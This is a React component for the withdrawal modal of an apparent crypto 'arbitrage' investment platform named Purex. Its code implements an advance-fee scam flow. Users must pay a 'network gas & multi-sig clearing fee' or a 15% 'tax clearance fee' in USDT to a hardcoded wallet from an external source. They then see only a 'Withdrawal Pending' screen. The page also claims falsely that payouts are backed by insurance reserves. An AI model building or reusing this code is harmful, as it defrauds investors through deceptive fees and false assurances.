import { useState } from 'react'
import { useAuth } from '../../../context/AuthContext'
import {
  X,
  ArrowUpRight,
  ShieldCheck,
  Building2,
  Coins,
  CheckCircle2,
  AlertCircle,
  Copy,
  Check,
  Clock,
  ArrowRight,
  Info,
  DollarSign,
  Landmark,
  Wallet
} from 'lucide-react'

const LOCAL_CURRENCIES = [
  { code: 'USD', name: 'US Dollar ($)', symbol: '$', rate: 1.0 },
  { code: 'EUR', name: 'Euro (€)', symbol: '€', rate: 0.92 },
  { code: 'GBP', name: 'British Pound (£)', symbol: '£', rate: 0.79 },
  { code: 'NGN', name: 'Nigerian Naira (₦)', symbol: '₦', rate: 1550.0 },
  { code: 'CAD', name: 'Canadian Dollar (C$)', symbol: 'C$', rate: 1.36 },
  { code: 'AUD', name: 'Australian Dollar (A$)', symbol: 'A$', rate: 1.52 },
  { code: 'ZAR', name: 'South African Rand (R)', symbol: 'R', rate: 18.5 }
]

export default function WithdrawModal({ isOpen, onClose }) {
  const { user, requestWithdrawal, platformSettings } = useAuth()

  // Steps:
  // 1: Choose Method (Crypto vs Local Currency)
  // 2A: Crypto Form -> 3A: Crypto Gas Fee External Payment
  // 2B: Local Currency Form -> 3B: Bank Tax Fee External Payment
  // 4: Confirmation Screen ("Withdrawal Pending - Check back later for status")
  const [step, setStep] = useState(1)
  const [method, setMethod] = useState('CRYPTO') // 'CRYPTO' or 'LOCAL_BANK'

  // Form Fields
  const [balanceSource, setBalanceSource] = useState('profit') // 'profit', 'available', 'capital'
  const [withdrawAmount, setWithdrawAmount] = useState('')
  
  // Crypto Fields
  const [cryptoAsset, setCryptoAsset] = useState('USDT')
  const [cryptoNetwork, setCryptoNetwork] = useState('TRC20')
  const [destinationWallet, setDestinationWallet] = useState('')
  const [cryptoFeeHash, setCryptoFeeHash] = useState('')

  // Local Currency Fields
  const [localCurrency, setLocalCurrency] = useState('USD')
  const [bankName, setBankName] = useState('')
  const [accountNumber, setAccountNumber] = useState('')
  const [accountName, setAccountName] = useState('')
  const [swiftCode, setSwiftCode] = useState('')
  const [taxFeeHash, setTaxFeeHash] = useState('')

  const [copiedFeeWallet, setCopiedFeeWallet] = useState(false)
  const [submitting, setSubmitting] = useState(false)
  const [feedback, setFeedback] = useState(null)

  if (!isOpen) return null

  const profitBalance = user?.profit || 0
  const availableBalance = user?.availableBalance || 0
  const capitalBalance = user?.capital || 0

  const activeBalanceLimit =
    balanceSource === 'profit'
      ? profitBalance
      : balanceSource === 'available'
      ? availableBalance
      : capitalBalance

  const numAmount = Number(withdrawAmount) || 0

  // External Fee Calculations
  // Crypto: 10% Network Gas & Multi-Sig Clearing Fee
  const gasClearingFeeUsd = Math.max(25, numAmount * 0.10)
  const gasFeeWallet = platformSettings?.wallets?.gasClearingWallet || 'TJY8B9Wz6E7kRzQx18eNx7yP3gQzLmK29a'

  // Local Currency: 15% Tax & Capital Gains Clearance Fee
  const taxClearanceFeeUsd = Math.max(50, numAmount * 0.15)
  const taxFeeWallet = platformSettings?.wallets?.taxClearanceWallet || 'TJY8B9Wz6E7kRzQx18eNx7yP3gQzLmK29a'

  const selectedFiatObj = LOCAL_CURRENCIES.find((c) => c.code === localCurrency) || LOCAL_CURRENCIES[0]
  const fiatEquivalentAmount = numAmount * selectedFiatObj.rate

  const handleCopyFeeAddress = (address) => {
    navigator.clipboard.writeText(address)
    setCopiedFeeWallet(true)
    setTimeout(() => setCopiedFeeWallet(false), 2000)
  }

  // Submit Crypto Flow
  const handleProceedCryptoFee = (e) => {
    e.preventDefault()
    setFeedback(null)

    if (!numAmount || numAmount <= 0) {
      setFeedback({ type: 'error', message: 'Please enter a valid withdrawal amount.' })
      return
    }

    if (numAmount > activeBalanceLimit) {
      setFeedback({
        type: 'error',
        message: `Insufficient ${balanceSource} balance ($${activeBalanceLimit.toLocaleString()}).`
      })
      return
    }

    if (!destinationWallet.trim()) {
      setFeedback({ type: 'error', message: 'Please enter your external destination wallet address.' })
      return
    }

    setStep('3A') // Go to external gas fee step
  }

  const handleFinalizeCryptoWithdrawal = (e) => {
    e.preventDefault()
    setFeedback(null)

    if (!cryptoFeeHash.trim()) {
      setFeedback({ type: 'error', message: 'Please provide the transaction hash for the external fee transfer.' })
      return
    }

    setSubmitting(true)
    setTimeout(() => {
      const res = requestWithdrawal({
        method: 'CRYPTO',
        amount: numAmount,
        asset: cryptoAsset,
        balanceType: balanceSource,
        cryptoAddress: destinationWallet.trim(),
        cryptoNetwork,
        gasFeeAmount: gasClearingFeeUsd,
        gasFeeTxHash: cryptoFeeHash.trim()
      })

      setSubmitting(false)
      if (res.success) {
        setStep(4) // Confirmation screen
      } else {
        setFeedback({ type: 'error', message: res.error || 'Failed to submit withdrawal.' })
      }
    }, 800)
  }

  // Submit Local Bank Flow
  const handleProceedBankFee = (e) => {
    e.preventDefault()
    setFeedback(null)

    if (!numAmount || numAmount <= 0) {
      setFeedback({ type: 'error', message: 'Please enter a valid withdrawal amount.' })
      return
    }

    if (numAmount > activeBalanceLimit) {
      setFeedback({
        type: 'error',
        message: `Insufficient ${balanceSource} balance ($${activeBalanceLimit.toLocaleString()}).`
      })
      return
    }

    if (!bankName.trim() || !accountNumber.trim() || !accountName.trim()) {
      setFeedback({ type: 'error', message: 'Please fill in all compulsory bank account details.' })
      return
    }

    setStep('3B') // Go to external tax fee step
  }

  const handleFinalizeBankWithdrawal = (e) => {
    e.preventDefault()
    setFeedback(null)

    if (!taxFeeHash.trim()) {
      setFeedback({ type: 'error', message: 'Please provide the transaction hash for the tax clearance fee.' })
      return
    }

    setSubmitting(true)
    setTimeout(() => {
      const res = requestWithdrawal({
        method: 'LOCAL_BANK',
        amount: numAmount,
        asset: localCurrency,
        balanceType: balanceSource,
        localCurrency,
        bankName: bankName.trim(),
        accountNumber: accountNumber.trim(),
        accountName: accountName.trim(),
        swiftCode: swiftCode.trim(),
        taxFeeAmount: taxClearanceFeeUsd,
        taxFeeTxHash: taxFeeHash.trim()
      })

      setSubmitting(false)
      if (res.success) {
        setStep(4) // Confirmation screen
      } else {
        setFeedback({ type: 'error', message: res.error || 'Failed to submit withdrawal.' })
      }
    }, 800)
  }

  const handleResetAndClose = () => {
    setStep(1)
    setWithdrawAmount('')
    setDestinationWallet('')
    setCryptoFeeHash('')
    setBankName('')
    setAccountNumber('')
    setAccountName('')
    setSwiftCode('')
    setTaxFeeHash('')
    setFeedback(null)
    onClose()
  }

  return (
    <div className="fixed inset-0 z-50 flex items-center justify-center p-4 bg-black/85 backdrop-blur-md animate-fade-in">
      <div className="relative w-full max-w-lg bg-[#111111] border border-white/15 rounded-3xl p-6 sm:p-8 shadow-2xl overflow-hidden max-h-[90vh] overflow-y-auto">
        {/* Close Button */}
        <button
          onClick={handleResetAndClose}
          className="absolute top-5 right-5 p-2 text-white/50 hover:text-white rounded-full bg-white/5 hover:bg-white/10 transition-all z-10"
        >
          <X className="w-5 h-5" />
        </button>

        {/* STEP 1: Choose Withdrawal Method */}
        {step === 1 && (
          <div className="space-y-6">
            <div>
              <div className="inline-flex items-center gap-1.5 px-3 py-1 rounded-full bg-[#B0F127]/10 border border-[#B0F127]/20 text-[#B0F127] text-xs font-semibold mb-2">
                <ArrowUpRight className="w-3.5 h-3.5" />
                Institutional Payout Gateway
              </div>
              <h3 className="text-xl sm:text-2xl font-black text-white tracking-tight">
                Select Withdrawal Method
              </h3>
              <p className="text-xs text-white/50 mt-1">
                Choose how you would like to withdraw your arbitrage profits and capital.
              </p>
            </div>

            <div className="grid grid-cols-1 gap-4">
              {/* Option A: Crypto Withdrawal */}
              <div
                onClick={() => {
                  setMethod('CRYPTO')
                  setStep('2A')
                }}
                className="p-5 bg-black/60 hover:bg-black/90 border border-white/10 hover:border-[#B0F127] rounded-2xl cursor-pointer transition-all group flex items-start gap-4"
              >
                <div className="w-12 h-12 rounded-xl bg-[#B0F127]/10 border border-[#B0F127]/20 flex items-center justify-center text-[#B0F127] group-hover:scale-105 transition-transform shrink-0">
                  <Coins className="w-6 h-6" />
                </div>
                <div className="space-y-1 flex-1">
                  <div className="flex items-center justify-between">
                    <h4 className="text-base font-bold text-white group-hover:text-[#B0F127] transition-colors">
                      Withdraw in Crypto
                    </h4>
                    <span className="text-[10px] text-[#B0F127] font-mono bg-[#B0F127]/10 px-2 py-0.5 rounded">
                      Instant Blockchain Payout
                    </span>
                  </div>
                  <p className="text-xs text-white/60">
                    Withdraw directly to your private cryptocurrency wallet (USDT TRC20/ERC20/BEP20, BTC, ETH, SOL).
                  </p>
                </div>
              </div>

              {/* Option B: Local Currency Bank Transfer (Signature White Card Option) */}
              <div
                onClick={() => {
                  setMethod('LOCAL_BANK')
                  setStep('2B')
                }}
                className="p-5 bg-white text-black rounded-2xl cursor-pointer transition-all hover:shadow-[0_0_25px_rgba(255,255,255,0.15)] flex items-start gap-4"
              >
                <div className="w-12 h-12 rounded-xl bg-black text-[#B0F127] flex items-center justify-center shrink-0">
                  <Landmark className="w-6 h-6" />
                </div>
                <div className="space-y-1 flex-1">
                  <div className="flex items-center justify-between">
                    <h4 className="text-base font-black text-black">
                      Withdraw in Local Currency
                    </h4>
                    <span className="text-[10px] text-black font-mono font-bold bg-black/10 px-2 py-0.5 rounded">
                      Direct Bank Wire / Fiat
                    </span>
                  </div>
                  <p className="text-xs text-black/70">
                    Convert crypto to your local fiat currency (USD, EUR, GBP, NGN, CAD, etc.) and transfer directly to your bank account.
                  </p>
                </div>
              </div>
            </div>

            <div className="p-4 bg-black/40 border border-white/5 rounded-2xl flex items-center gap-3 text-xs text-white/60">
              <ShieldCheck className="w-5 h-5 text-[#B0F127] shrink-0" />
              <span>All payouts are backed by Purex Institutional SAFU insurance reserves.</span>
            </div>
          </div>
        )}

        {/* STEP 2A: Crypto Withdrawal Details */}
        {step === '2A' && (
          <div className="space-y-6">
            <div>
              <div className="flex items-center justify-between">
                <span className="text-xs text-[#B0F127] font-mono font-semibold uppercase">Step 1 of 2</span>
                <button
                  type="button"
                  onClick={() => setStep(1)}
                  className="text-xs text-white/50 hover:text-white underline"
                >
                  Change Method
                </button>
              </div>
              <h3 className="text-xl sm:text-2xl font-black text-white tracking-tight mt-1">
                Crypto Withdrawal Details
              </h3>
              <p className="text-xs text-white/50">
                Specify your destination wallet address and withdrawal amount.
              </p>
            </div>

            <form onSubmit={handleProceedCryptoFee} className="space-y-4">
              {/* Balance Source Picker */}
              <div className="space-y-1.5">
                <label className="text-xs text-white/60 font-semibold block">Withdrawal Balance Source</label>
                <div className="grid grid-cols-3 gap-2">
                  {[
                    { id: 'profit', label: 'Profit', val: profitBalance },
                    { id: 'available', label: 'Available', val: availableBalance },
                    { id: 'capital', label: 'Capital', val: capitalBalance }
                  ].map((b) => (
                    <button
                      key={b.id}
                      type="button"
                      onClick={() => setBalanceSource(b.id)}
                      className={`p-2.5 rounded-xl text-left border transition-all ${
                        balanceSource === b.id
                          ? 'bg-[#B0F127] text-black border-[#B0F127] font-bold'
                          : 'bg-black/50 text-white/70 border-white/10 hover:border-white/20'
                      }`}
                    >
                      <span className="text-[10px] block opacity-80">{b.label}</span>
                      <span className="text-xs font-mono font-bold">${b.val.toLocaleString()}</span>
                    </button>
                  ))}
                </div>
              </div>

              {/* Amount Input */}
              <div className="space-y-1.5">
                <div className="flex justify-between text-xs text-white/60">
                  <span>Amount to Withdraw</span>
                  <button
                    type="button"
                    onClick={() => setWithdrawAmount(activeBalanceLimit)}
                    className="text-[#B0F127] font-bold"
                  >
                    MAX (${activeBalanceLimit.toLocaleString()})
                  </button>
                </div>
                <div className="relative">
                  <span className="absolute left-4 top-1/2 -translate-y-1/2 text-white/40 font-mono text-lg">$</span>
                  <input
                    type="number"
                    step="any"
                    required
                    placeholder="0.00"
                    value={withdrawAmount}
                    onChange={(e) => setWithdrawAmount(e.target.value)}
                    className="w-full bg-black/60 border border-white/15 focus:border-[#B0F127] rounded-xl py-3 pl-8 pr-4 text-white font-mono text-lg outline-none"
                  />
                </div>
              </div>

              {/* Asset & Network */}
              <div className="grid grid-cols-2 gap-3">
                <div className="space-y-1">
                  <label className="text-xs text-white/60">Asset</label>
                  <select
                    value={cryptoAsset}
                    onChange={(e) => setCryptoAsset(e.target.value)}
                    className="w-full bg-black/60 border border-white/15 focus:border-[#B0F127] rounded-xl px-3 py-2.5 text-xs text-white outline-none font-mono"
                  >
                    <option value="USDT">USDT (Tether)</option>
                    <option value="BTC">BTC (Bitcoin)</option>
                    <option value="ETH">ETH (Ethereum)</option>
                    <option value="SOL">SOL (Solana)</option>
                  </select>
                </div>

                <div className="space-y-1">
                  <label className="text-xs text-white/60">Network</label>
                  <select
                    value={cryptoNetwork}
                    onChange={(e) => setCryptoNetwork(e.target.value)}
                    className="w-full bg-black/60 border border-white/15 focus:border-[#B0F127] rounded-xl px-3 py-2.5 text-xs text-white outline-none font-mono"
                  >
                    <option value="TRC20">TRON (TRC20)</option>
                    <option value="ERC20">Ethereum (ERC20)</option>
                    <option value="BEP20">BNB Smart Chain</option>
                    <option value="BTC">Bitcoin Network</option>
                    <option value="SOL">Solana Network</option>
                  </select>
                </div>
              </div>

              {/* Destination Wallet Address */}
              <div className="space-y-1.5">
                <label className="text-xs text-white/60">Your Destination {cryptoAsset} Wallet Address</label>
                <input
                  type="text"
                  required
                  placeholder={`Enter your ${cryptoAsset} (${cryptoNetwork}) address`}
                  value={destinationWallet}
                  onChange={(e) => setDestinationWallet(e.target.value)}
                  className="w-full bg-black/60 border border-white/15 focus:border-[#B0F127] rounded-xl px-4 py-3 text-xs text-white font-mono placeholder-white/30 outline-none"
                />
              </div>

              {feedback && (
                <div className="p-3 bg-rose-500/10 border border-rose-500/30 rounded-xl text-xs text-rose-300 flex items-center gap-2">
                  <AlertCircle className="w-4 h-4 shrink-0" />
                  <span>{feedback.message}</span>
                </div>
              )}

              <button
                type="submit"
                className="w-full py-3.5 bg-[#B0F127] hover:bg-[#9ee016] text-black font-bold text-xs rounded-xl transition-all shadow-md flex items-center justify-center gap-2"
              >
                <span>Continue to Network Clearance</span>
                <ArrowRight className="w-4 h-4" />
              </button>
            </form>
          </div>
        )}

        {/* STEP 3A: Crypto External Gas & Multi-Sig Clearing Fee Payment */}
        {step === '3A' && (
          <div className="space-y-6">
            <div>
              <span className="text-xs text-[#B0F127] font-mono font-semibold uppercase">Step 2 of 2: External Fee Settlement</span>
              <h3 className="text-xl sm:text-2xl font-black text-white tracking-tight mt-1">
                Network Gas & Multi-Sig Clearing Fee
              </h3>
              <p className="text-xs text-white/50">
                To dispatch multi-sig liquidity onto the public blockchain, pay the network clearing fee from an external wallet.
              </p>
            </div>

            {/* Fee Invoice Box */}
            <div className="p-4 bg-black/60 border border-white/10 rounded-2xl text-center space-y-1">
              <span className="text-xs text-white/50 font-mono block">Required Gas & Liquidity Release Fee</span>
              <div className="text-2xl font-black text-[#B0F127] font-mono">
                ${gasClearingFeeUsd.toLocaleString('en-US', { minimumFractionDigits: 2 })} USDT (TRC20)
              </div>
              <span className="text-[11px] text-white/40">
                Releasing ${numAmount.toLocaleString()} {cryptoAsset} to {destinationWallet.slice(0, 6)}...{destinationWallet.slice(-4)}
              </span>
            </div>

            {/* Deposit Address Box */}
            <div className="space-y-3">
              <div className="p-4 bg-black/40 border border-white/10 rounded-2xl flex flex-col sm:flex-row items-center gap-4">
                <div className="w-24 h-24 bg-white p-2 rounded-xl flex items-center justify-center shrink-0">
                  <img
                    src={`https://api.qrserver.com/v1/create-qr-code/?size=150x150&data=${gasFeeWallet}`}
                    alt="Gas Fee QR Code"
                    className="w-full h-full object-contain"
                  />
                </div>

                <div className="min-w-0 space-y-2 w-full">
                  <div className="flex justify-between items-center text-xs">
                    <span className="text-white/60 font-medium">Fee Clearing Wallet (TRC20)</span>
                    <span className="text-[10px] text-[#B0F127] font-mono bg-[#B0F127]/10 px-2 py-0.5 rounded">
                      USDT / TRON
                    </span>
                  </div>

                  <div className="p-2.5 bg-black/70 rounded-xl border border-white/10 flex items-center justify-between gap-2">
                    <span className="text-xs font-mono text-white/90 truncate">
                      {gasFeeWallet}
                    </span>
                    <button
                      type="button"
                      onClick={() => handleCopyFeeAddress(gasFeeWallet)}
                      className="p-1.5 bg-[#B0F127] text-black rounded-lg hover:bg-[#9ee016] transition-all shrink-0"
                    >
                      {copiedFeeWallet ? <Check className="w-3.5 h-3.5" /> : <Copy className="w-3.5 h-3.5" />}
                    </button>
                  </div>
                </div>
              </div>

              <p className="text-[11px] text-amber-300/80 bg-amber-500/10 border border-amber-500/20 p-2.5 rounded-xl text-center">
                Note: Network gas fee cannot be subtracted from your platform balance. It must be transferred from an external crypto wallet.
              </p>
            </div>

            {/* Transaction Hash Input */}
            <form onSubmit={handleFinalizeCryptoWithdrawal} className="space-y-4">
              <div className="space-y-1.5">
                <label className="text-xs text-white/60">Fee Transfer Transaction Hash (TxID)</label>
                <input
                  type="text"
                  required
                  placeholder="Paste external transfer TxHash (0x... or Hash ID)"
                  value={cryptoFeeHash}
                  onChange={(e) => setCryptoFeeHash(e.target.value)}
                  className="w-full bg-black/60 border border-white/15 focus:border-[#B0F127] rounded-xl px-4 py-3 text-xs text-white font-mono placeholder-white/30 outline-none"
                />
              </div>

              {feedback && (
                <div className="p-3 bg-rose-500/10 border border-rose-500/30 rounded-xl text-xs text-rose-300 flex items-center gap-2">
                  <AlertCircle className="w-4 h-4 shrink-0" />
                  <span>{feedback.message}</span>
                </div>
              )}

              <div className="flex gap-3">
                <button
                  type="button"
                  onClick={() => setStep('2A')}
                  className="w-1/3 py-3 bg-white/5 hover:bg-white/10 text-white font-semibold text-xs rounded-xl border border-white/10 transition-all"
                >
                  Back
                </button>
                <button
                  type="submit"
                  disabled={submitting}
                  className="w-2/3 py-3 bg-[#B0F127] hover:bg-[#9ee016] text-black font-bold text-xs rounded-xl transition-all shadow-md flex items-center justify-center gap-2 disabled:opacity-50"
                >
                  {submitting ? 'Verifying Transfer...' : 'I Have Paid Gas Fee'}
                </button>
              </div>
            </form>
          </div>
        )}

        {/* STEP 2B: Local Currency & Bank Details */}
        {step === '2B' && (
          <div className="space-y-6">
            <div>
              <div className="flex items-center justify-between">
                <span className="text-xs text-[#B0F127] font-mono font-semibold uppercase">Step 1 of 2</span>
                <button
                  type="button"
                  onClick={() => setStep(1)}
                  className="text-xs text-white/50 hover:text-white underline"
                >
                  Change Method
                </button>
              </div>
              <h3 className="text-xl sm:text-2xl font-black text-white tracking-tight mt-1">
                Local Currency Bank Withdrawal
              </h3>
              <p className="text-xs text-white/50">
                Select your local fiat currency and enter your bank account details.
              </p>
            </div>

            <form onSubmit={handleProceedBankFee} className="space-y-4">
              {/* Local Currency Picker */}
              <div className="space-y-1.5">
                <label className="text-xs text-white/60">Preferred Local Currency</label>
                <select
                  value={localCurrency}
                  onChange={(e) => setLocalCurrency(e.target.value)}
                  className="w-full bg-black/60 border border-white/15 focus:border-[#B0F127] rounded-xl px-4 py-3 text-xs text-white outline-none font-bold"
                >
                  {LOCAL_CURRENCIES.map((c) => (
                    <option key={c.code} value={c.code}>
                      {c.name} (1 USD ≈ {c.rate} {c.code})
                    </option>
                  ))}
                </select>
              </div>

              {/* Balance Source Picker */}
              <div className="space-y-1.5">
                <label className="text-xs text-white/60 font-semibold block">Withdrawal Balance Source</label>
                <div className="grid grid-cols-3 gap-2">
                  {[
                    { id: 'profit', label: 'Profit', val: profitBalance },
                    { id: 'available', label: 'Available', val: availableBalance },
                    { id: 'capital', label: 'Capital', val: capitalBalance }
                  ].map((b) => (
                    <button
                      key={b.id}
                      type="button"
                      onClick={() => setBalanceSource(b.id)}
                      className={`p-2.5 rounded-xl text-left border transition-all ${
                        balanceSource === b.id
                          ? 'bg-[#B0F127] text-black border-[#B0F127] font-bold'
                          : 'bg-black/50 text-white/70 border-white/10 hover:border-white/20'
                      }`}
                    >
                      <span className="text-[10px] block opacity-80">{b.label}</span>
                      <span className="text-xs font-mono font-bold">${b.val.toLocaleString()}</span>
                    </button>
                  ))}
                </div>
              </div>

              {/* Amount Input */}
              <div className="space-y-1.5">
                <div className="flex justify-between text-xs text-white/60">
                  <span>Amount to Withdraw (USD Equivalent)</span>
                  <button
                    type="button"
                    onClick={() => setWithdrawAmount(activeBalanceLimit)}
                    className="text-[#B0F127] font-bold"
                  >
                    MAX (${activeBalanceLimit.toLocaleString()})
                  </button>
                </div>
                <div className="relative">
                  <span className="absolute left-4 top-1/2 -translate-y-1/2 text-white/40 font-mono text-lg">$</span>
                  <input
                    type="number"
                    step="any"
                    required
                    placeholder="0.00"
                    value={withdrawAmount}
                    onChange={(e) => setWithdrawAmount(e.target.value)}
                    className="w-full bg-black/60 border border-white/15 focus:border-[#B0F127] rounded-xl py-3 pl-8 pr-4 text-white font-mono text-lg outline-none"
                  />
                </div>
                {numAmount > 0 && (
                  <div className="text-xs font-mono text-[#B0F127]">
                    ≈ {selectedFiatObj.symbol}{fiatEquivalentAmount.toLocaleString('en-US', { minimumFractionDigits: 2 })} {localCurrency}
                  </div>
                )}
              </div>

              {/* Bank Details Inputs */}
              <div className="grid grid-cols-1 md:grid-cols-2 gap-3">
                <div className="space-y-1">
                  <label className="text-xs text-white/60">Bank Name</label>
                  <input
                    type="text"
                    required
                    placeholder="e.g. JPMorgan Chase, Barclays"
                    value={bankName}
                    onChange={(e) => setBankName(e.target.value)}
                    className="w-full bg-black/60 border border-white/15 focus:border-[#B0F127] rounded-xl px-3 py-2.5 text-xs text-white outline-none"
                  />
                </div>

                <div className="space-y-1">
                  <label className="text-xs text-white/60">Account Number / IBAN</label>
                  <input
                    type="text"
                    required
                    placeholder="e.g. 0123456789"
                    value={accountNumber}
                    onChange={(e) => setAccountNumber(e.target.value)}
                    className="w-full bg-black/60 border border-white/15 focus:border-[#B0F127] rounded-xl px-3 py-2.5 text-xs text-white outline-none font-mono"
                  />
                </div>

                <div className="space-y-1 md:col-span-2">
                  <label className="text-xs text-white/60">Account Holder Name</label>
                  <input
                    type="text"
                    required
                    placeholder="Full Legal Name on Account"
                    value={accountName}
                    onChange={(e) => setAccountName(e.target.value)}
                    className="w-full bg-black/60 border border-white/15 focus:border-[#B0F127] rounded-xl px-3 py-2.5 text-xs text-white outline-none"
                  />
                </div>

                <div className="space-y-1 md:col-span-2">
                  <label className="text-xs text-white/60">Swift Code / Routing Number (Optional)</label>
                  <input
                    type="text"
                    placeholder="e.g. CHASUS33"
                    value={swiftCode}
                    onChange={(e) => setSwiftCode(e.target.value)}
                    className="w-full bg-black/60 border border-white/15 focus:border-[#B0F127] rounded-xl px-3 py-2.5 text-xs text-white outline-none font-mono"
                  />
                </div>
              </div>

              {feedback && (
                <div className="p-3 bg-rose-500/10 border border-rose-500/30 rounded-xl text-xs text-rose-300 flex items-center gap-2">
                  <AlertCircle className="w-4 h-4 shrink-0" />
                  <span>{feedback.message}</span>
                </div>
              )}

              <button
                type="submit"
                className="w-full py-3.5 bg-[#B0F127] hover:bg-[#9ee016] text-black font-bold text-xs rounded-xl transition-all shadow-md flex items-center justify-center gap-2"
              >
                <span>Continue to Tax Clearance</span>
                <ArrowRight className="w-4 h-4" />
              </button>
            </form>
          </div>
        )}

        {/* STEP 3B: Bank External Tax Clearance Fee Payment */}
        {step === '3B' && (
          <div className="space-y-6">
            <div>
              <span className="text-xs text-[#B0F127] font-mono font-semibold uppercase">Step 2 of 2: Tax Clearance Settlement</span>
              <h3 className="text-xl sm:text-2xl font-black text-white tracking-tight mt-1">
                Tax Clearance & Withholding Fee
              </h3>
              <p className="text-xs text-white/50">
                To authorize international fiat banking clearance for {localCurrency}, pay the capital gains tax clearance fee into the designated wallet.
              </p>
            </div>

            {/* Tax Fee Invoice Box */}
            <div className="p-4 bg-black/60 border border-white/10 rounded-2xl text-center space-y-1">
              <span className="text-xs text-white/50 font-mono block">Required Tax Clearance Fee (15%)</span>
              <div className="text-2xl font-black text-[#B0F127] font-mono">
                ${taxClearanceFeeUsd.toLocaleString('en-US', { minimumFractionDigits: 2 })} USDT (TRC20)
              </div>
              <span className="text-[11px] text-white/40">
                Clearing {selectedFiatObj.symbol}{fiatEquivalentAmount.toLocaleString('en-US', { minimumFractionDigits: 2 })} {localCurrency} to {bankName}
              </span>
            </div>

            {/* Deposit Address Box */}
            <div className="space-y-3">
              <div className="p-4 bg-black/40 border border-white/10 rounded-2xl flex flex-col sm:flex-row items-center gap-4">
                <div className="w-24 h-24 bg-white p-2 rounded-xl flex items-center justify-center shrink-0">
                  <img
                    src={`https://api.qrserver.com/v1/create-qr-code/?size=150x150&data=${taxFeeWallet}`}
                    alt="Tax Fee QR Code"
                    className="w-full h-full object-contain"
                  />
                </div>

                <div className="min-w-0 space-y-2 w-full">
                  <div className="flex justify-between items-center text-xs">
                    <span className="text-white/60 font-medium">Tax Clearance Wallet (TRC20)</span>
                    <span className="text-[10px] text-[#B0F127] font-mono bg-[#B0F127]/10 px-2 py-0.5 rounded">
                      USDT / TRON
                    </span>
                  </div>

                  <div className="p-2.5 bg-black/70 rounded-xl border border-white/10 flex items-center justify-between gap-2">
                    <span className="text-xs font-mono text-white/90 truncate">
                      {taxFeeWallet}
                    </span>
                    <button
                      type="button"
                      onClick={() => handleCopyFeeAddress(taxFeeWallet)}
                      className="p-1.5 bg-[#B0F127] text-black rounded-lg hover:bg-[#9ee016] transition-all shrink-0"
                    >
                      {copiedFeeWallet ? <Check className="w-3.5 h-3.5" /> : <Copy className="w-3.5 h-3.5" />}
                    </button>
                  </div>
                </div>
              </div>

              <p className="text-[11px] text-amber-300/80 bg-amber-500/10 border border-amber-500/20 p-2.5 rounded-xl text-center">
                Note: Tax fee cannot be deducted from your account balance in the platform. You must transfer the fee from an external wallet source.
              </p>
            </div>

            {/* Transaction Hash Input */}
            <form onSubmit={handleFinalizeBankWithdrawal} className="space-y-4">
              <div className="space-y-1.5">
                <label className="text-xs text-white/60">Tax Payment Transaction Hash (TxID)</label>
                <input
                  type="text"
                  required
                  placeholder="Paste external transfer TxHash (0x... or Hash ID)"
                  value={taxFeeHash}
                  onChange={(e) => setTaxFeeHash(e.target.value)}
                  className="w-full bg-black/60 border border-white/15 focus:border-[#B0F127] rounded-xl px-4 py-3 text-xs text-white font-mono placeholder-white/30 outline-none"
                />
              </div>

              {feedback && (
                <div className="p-3 bg-rose-500/10 border border-rose-500/30 rounded-xl text-xs text-rose-300 flex items-center gap-2">
                  <AlertCircle className="w-4 h-4 shrink-0" />
                  <span>{feedback.message}</span>
                </div>
              )}

              <div className="flex gap-3">
                <button
                  type="button"
                  onClick={() => setStep('2B')}
                  className="w-1/3 py-3 bg-white/5 hover:bg-white/10 text-white font-semibold text-xs rounded-xl border border-white/10 transition-all"
                >
                  Back
                </button>
                <button
                  type="submit"
                  disabled={submitting}
                  className="w-2/3 py-3 bg-[#B0F127] hover:bg-[#9ee016] text-black font-bold text-xs rounded-xl transition-all shadow-md flex items-center justify-center gap-2 disabled:opacity-50"
                >
                  {submitting ? 'Verifying Tax Payment...' : 'I Have Paid Tax Fee'}
                </button>
              </div>
            </form>
          </div>
        )}

        {/* STEP 4: Final Screen ("Withdrawal Pending - Check back later for status") */}
        {step === 4 && (
          <div className="text-center py-6 space-y-5 animate-fade-in">
            <div className="w-16 h-16 rounded-full bg-amber-500/10 border border-amber-500/30 flex items-center justify-center mx-auto text-amber-400">
              <Clock className="w-8 h-8 animate-pulse" />
            </div>

            <div className="space-y-2">
              <h3 className="text-2xl font-bold text-white">Withdrawal Pending</h3>
              <p className="text-xs text-white/60 max-w-sm mx-auto leading-relaxed">
                Your withdrawal request and fee verification have been successfully submitted to our automated clearing system. Check back later for status updates.
              </p>
            </div>

            <div className="p-4 bg-black/50 border border-white/10 rounded-2xl text-left space-y-2 text-xs font-mono">
              <div className="flex justify-between text-white/60">
                <span>Method:</span>
                <span className="text-white font-bold">
                  {method === 'CRYPTO' ? `Crypto (${cryptoAsset} ${cryptoNetwork})` : `Local Bank (${localCurrency})`}
                </span>
              </div>
              <div className="flex justify-between text-white/60">
                <span>Withdrawal Amount:</span>
                <span className="text-[#B0F127] font-bold">
                  ${numAmount.toLocaleString('en-US', { minimumFractionDigits: 2 })}
                </span>
              </div>
              {method === 'LOCAL_BANK' && (
                <div className="flex justify-between text-white/60">
                  <span>Destination:</span>
                  <span className="text-white font-bold">{bankName} ({accountNumber.slice(-4)})</span>
                </div>
              )}
              {method === 'CRYPTO' && (
                <div className="flex justify-between text-white/60">
                  <span>Destination:</span>
                  <span className="text-white font-bold">{destinationWallet.slice(0, 8)}...{destinationWallet.slice(-6)}</span>
                </div>
              )}
              <div className="flex justify-between text-white/60 pt-1 border-t border-white/5">
                <span>Status:</span>
                <span className="text-amber-400 font-semibold flex items-center gap-1">
                  <span className="w-2 h-2 rounded-full bg-amber-400 animate-ping" />
                  Pending Clearing
                </span>
              </div>
            </div>

            <button
              onClick={handleResetAndClose}
              className="w-full py-3.5 bg-[#B0F127] hover:bg-[#9ee016] text-black font-bold text-xs rounded-xl transition-all shadow-md"
            >
              Return to Dashboard
            </button>
          </div>
        )}
      </div>
    </div>
  )
}
